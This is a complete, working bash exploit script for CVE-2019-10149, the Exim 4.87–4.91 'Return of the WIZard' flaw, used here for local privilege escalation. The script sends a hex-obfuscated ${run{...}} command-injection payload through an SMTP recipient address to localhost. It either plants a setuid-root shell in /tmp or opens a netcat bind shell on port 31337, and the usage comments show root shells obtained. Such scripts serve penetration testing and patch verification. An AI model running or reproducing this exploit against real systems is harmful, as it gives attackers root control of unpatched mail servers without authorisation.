#!/bin/bash

#
# raptor_exim_wiz - "The Return of the WIZard" LPE exploit
# Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# A flaw was found in Exim versions 4.87 to 4.91 (inclusive).
# Improper validation of recipient address in deliver_message()
# function in /src/deliver.c may lead to remote command execution.
# (CVE-2019-10149)
#
# This is a local privilege escalation exploit for "The Return
# of the WIZard" vulnerability reported by the Qualys Security
# Advisory team.
#
# Credits:
# Qualys Security Advisory team (kudos for your amazing research!)
# Dennis 'dhn' Herrmann (/dev/tcp technique)
#
# Usage (setuid method):
# $ id
# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
# $ ./raptor_exim_wiz -m setuid
# Preparing setuid shell helper...
# Delivering setuid payload...
# [...]
# Waiting 5 seconds...
# -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned
# # id
# uid=0(root) gid=0(root) groups=0(root)
#
# Usage (netcat method):
# $ id
# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
# $ ./raptor_exim_wiz -m netcat
# Delivering netcat payload...
# Waiting 5 seconds...
# localhost [127.0.0.1] 31337 (?) open
# id
# uid=0(root) gid=0(root) groups=0(root)
#
# Vulnerable platforms:
# Exim 4.87 - 4.91
#
# Tested against:
# Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]
#

METHOD="setuid" # default method
PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'
PAYLOAD_NETCAT='${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22}}@localhost'

# usage instructions
function usage()
{
	echo "$0 [-m METHOD]"
	echo
	echo "-m setuid : use the setuid payload (default)"
	echo "-m netcat : use the netcat payload"
	echo
	exit 1
}

# payload delivery
function exploit()
{
	# connect to localhost:25
	exec 3<>/dev/tcp/localhost/25

	# deliver the payload
	read -u 3 && echo $REPLY
	echo "helo localhost" >&3
	read -u 3 && echo $REPLY
	echo "mail from:<>" >&3
	read -u 3 && echo $REPLY
	echo "rcpt to:<$PAYLOAD>" >&3
	read -u 3 && echo $REPLY
	echo "data" >&3
	read -u 3 && echo $REPLY
	for i in {1..31}
	do
		echo "Received: $i" >&3
	done
	echo "." >&3
	read -u 3 && echo $REPLY
	echo "quit" >&3
	read -u 3 && echo $REPLY
}

# print banner
echo
echo 'raptor_exim_wiz - "The Return of the WIZard" LPE exploit'
echo 'Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>'
echo

# parse command line
while [ ! -z "$1" ]; do
	case $1 in
		-m) shift; METHOD="$1"; shift;;
		* ) usage
		;;
	esac
done
if [ -z $METHOD ]; then
	usage
fi

# setuid method
if [ $METHOD = "setuid" ]; then

	# prepare a setuid shell helper to circumvent bash checks
	echo "Preparing setuid shell helper..."
	echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" >/tmp/pwned.c
	gcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null
	if [ $? -ne 0 ]; then
		echo "Problems compiling setuid shell helper, check your gcc."
		echo "Falling back to the /bin/sh method."
		cp /bin/sh /tmp/pwned
	fi
	echo

	# select and deliver the payload
	echo "Delivering $METHOD payload..."
	PAYLOAD=$PAYLOAD_SETUID
	exploit
	echo

	# wait for the magic to happen and spawn our shell
	echo "Waiting 5 seconds..."
	sleep 5
	ls -l /tmp/pwned
	/tmp/pwned

# netcat method
elif [ $METHOD = "netcat" ]; then

	# select and deliver the payload
	echo "Delivering $METHOD payload..."
	PAYLOAD=$PAYLOAD_NETCAT
	exploit
	echo

	# wait for the magic to happen and spawn our shell
	echo "Waiting 5 seconds..."
	sleep 5
	nc -v 127.0.0.1 31337

# print help
else
	usage
fi